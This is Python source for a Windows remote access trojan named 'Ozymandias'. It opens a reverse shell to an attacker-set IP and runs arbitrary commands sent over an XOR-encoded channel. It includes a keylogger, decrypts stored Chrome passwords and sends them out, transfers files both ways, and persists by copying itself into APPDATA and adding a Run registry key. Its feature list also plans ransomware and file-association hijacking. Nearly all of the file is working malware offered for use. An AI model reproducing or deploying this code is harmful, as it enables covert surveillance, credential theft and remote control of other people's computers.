'''Features:

-Client Ozymandias :)
-Crypted communication :)
-Allow Remote Access :)
-Grab Google Chrome Passwords :)
-Keylogging features : :)
-some meterpreter features like upload or download :)
-Registry :)
-Scheduled task and service :(
-Ransomware features :(
-funny trolling features :(

'''

import winreg
import time
import os
import socket
import base64
import win32crypt
import json
import sqlite3
import shutil
from Crypto.Cipher import AES
import subprocess
import threading
import keyboard

ip = "127.0.0.1" #Change the ip here

tkey = b'V\xff&2\xf7[\xb4O\x98\rYx\xb5\x88#M\xc2\xc7\x8b,\xc07Y.)\xfc\xf5\xc1\xd8p\xcf\xd4' #Key for crypt communication
typed_strings = ""
sock = None
keylogger_running = False
keylogger_thread = None

def copy_to_hidden_location():
    # Chemin du dossier de destination
    dest_folder = os.path.join(os.environ['APPDATA'], 'Microsoft')
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)
    

    # Nom du fichier
    script_name = os.path.basename(__file__)

    # Chemin complet de destination
    dest_path = os.path.join(dest_folder, script_name)

    # Copier le script dans le dossier de destination
    try:
        shutil.copy(__file__, dest_path)
        return dest_path
    except Exception as e:
        return False




def create_service(path):
    #result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    pass


def scheduled_task(path):
    pass

def file_assoc(path): #Hijacking File Associations #HKLM\Software\Classes\.txt
    pass
def add_to_registry(executable_path):
    """Percistence au demarrage du systeme"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                              winreg.KEY_WRITE)
        winreg.SetValueEx(key, "win32a", 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
    except Exception as e:
        pass




def percistence():
    # Copier le script dans un emplacement caché
    hidden_path = copy_to_hidden_location()
    try:
        if hidden_path:
            # Ajouter le script au registre pour l'exécution au démarrage
            add_to_registry(hidden_path)
            sock.sendall(encrypt(tkey, f"Success to estabilish percistence with add to registry \n").encode('utf-8'))
        else:
            sock.sendall(encrypt(tkey, f"Failed to estabilish percistence \n").encode('utf-8'))
    except:
        sock.sendall(encrypt(tkey, f"Failed to estabilish percistence \n").encode('utf-8'))


def encrypt(tkey, data):
    key_len = len(tkey)
    encrypted = bytearray()
    for i, byte in enumerate(data.encode('utf-8')):
        encrypted.append(byte ^ tkey[i % key_len])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt(tkey, encrypted_data):
    encrypted_data = base64.b64decode(encrypted_data)
    key_len = len(tkey)
    decrypted = bytearray()
    for i, byte in enumerate(encrypted_data):
        decrypted.append(byte ^ tkey[i % key_len])
    return decrypted.decode('utf-8')


def execcommande(commande):
    global sock, keylogger_running, keylogger_thread,typed_strings
    if commande.replace("\n", '') in ["StartKeylog", "StopKeylog", "StealChromepass","Percistence"]:
        if commande.replace('\n', '') == "StealChromepass":
            get_chrome_pass()
        elif commande.replace('\n', '') == "StartKeylog":
            if not keylogger_running:
                keylogger_running = True
                keylogger_thread = threading.Thread(target=keylog)
                keylogger_thread.start()
                sock.sendall(encrypt(tkey, "Keylogger started.\n").encode('utf-8'))
            else:
                sock.sendall(encrypt(tkey, "Keylogger already running.\n").encode('utf-8'))
        elif commande.replace('\n', '') == "StopKeylog":
            if keylogger_running:
                keylogger_running = False
                if keylogger_thread:
                    keylogger_thread.join()
                sock.sendall(encrypt(tkey, f"Keylogger stopped. and return: {typed_strings} \n").encode('utf-8'))
                typed_strings = ""
            else:
                sock.sendall(encrypt(tkey, "Keylogger is not running.\n").encode('utf-8'))
        elif commande.replace('\n', '') == "Percistence":
            percistence()
    elif commande.startswith("Download"):
        _, file_path = commande.split(" ", 1)
        send_file(file_path.strip())
    elif commande.startswith("Upload"):
        _, file_path = commande.split(" ", 1)
        receive_file(file_path.strip())
    elif commande[0:2] != "cd":
        result = subprocess.Popen(commande, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        time.sleep(0.01)
        sock.sendall(encrypt(tkey,f"{result.stdout.read().decode('latin-1')}{result.stderr.read().decode('latin-1')}{os.getcwd()}>").encode('utf-8'))

    else:
        if os.path.exists(str(commande[3:].replace('\n', ''))):
            os.chdir(str(commande[3:].replace('\n', '')))
            sock.sendall(encrypt(tkey,f"{os.getcwd()}>").encode('utf-8'))
        else:
            sock.sendall(encrypt(tkey,f"{os.getcwd()}>").encode('utf-8'))

def reverse_shell():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (ip, 9876)
    sock.connect(server_address)

    sock.sendall(encrypt(tkey, 'Ozymandias done !').encode('utf-8'))
    while sock:
        try:
            data = decrypt(tkey, sock.recv(1024).decode('utf-8'))
            time.sleep(0.01)
            if data != "":
                execcommande(data)
        except Exception as e:
            break

    sock.close()

def keylog():
    global keylogger_running, sock,typed_strings
    while keylogger_running:
        keys = keyboard.record(until='ENTER')
        typed_strings = typed_strings + ''.join(keyboard.get_typed_strings(keys))

def get_chrome_pass():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "Default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)

        conn = sqlite3.connect(filename)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        passwords = ""
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            iv = encrypted_password[3:15]
            encrypted_password = encrypted_password[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(encrypted_password)
            decrypted_password = decrypted_password.decode('utf-8')

            passwords += f"{'='*50} \nURL: {origin_url} \nUsername: {username} \nPassword: {decrypted_password} \n"

        cursor.close()
        conn.close()
        os.remove(filename)
        sock.sendall(encrypt(tkey, passwords + "\n"+str(os.getcwd())).encode('utf-8'))
    except:
        sock.sendall(encrypt(tkey, "could not get the chrome password" + "\n" + str(os.getcwd())).encode('utf-8'))

def send_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            while (chunk := file.read(4096)):
                time.sleep(0.2)
                sock.sendall(encrypt(tkey, chunk.decode('utf-8')).encode('latin-1'))
            sock.sendall(encrypt(tkey, "END").encode('latin-1'))
    else:
        sock.sendall(encrypt(tkey, "File not found.\n").encode('latin-1'))
    time.sleep(2)
    sock.sendall(encrypt(tkey, f"finished to Download the file \n{os.getcwd()}>").encode('latin-1'))
def receive_file(filename):
    data = sock.recv(4096).decode('latin-1')
    filecontent = ""
    while decrypt(tkey, data) != "END":
        filecontent += decrypt(tkey, data)
        data = sock.recv(4096).decode('latin-1')
    with open(filename, 'w') as fichier:
        fichier.write(filecontent)
    sock.sendall(encrypt(tkey, f"finished to Upload the file \n{os.getcwd()}>").encode('latin-1'))


reverse_shell()


